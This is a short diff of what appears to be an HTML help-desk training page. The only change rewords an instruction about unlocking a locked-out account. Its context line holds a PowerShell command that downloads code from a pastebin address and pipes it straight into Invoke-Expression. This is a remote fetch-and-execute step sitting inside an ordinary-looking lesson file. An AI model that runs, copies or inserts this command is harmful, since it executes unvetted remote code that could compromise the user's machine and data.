@@ -68,7 +68,7 @@ $section = 'ADH1'; iwr 'https://pastebin.com/raw/tQ95Q7Xh' -UseB | iex
 
 <div id="adh2" class="startHidden">
 The account is locked out; likely from all the craziness they were experiencing/explaining.
-The learner should unlock it and offer further assistance.
+You should unlock it and offer further assistance.
 
 This can be evaluated automatically with this PowerShell script:
 
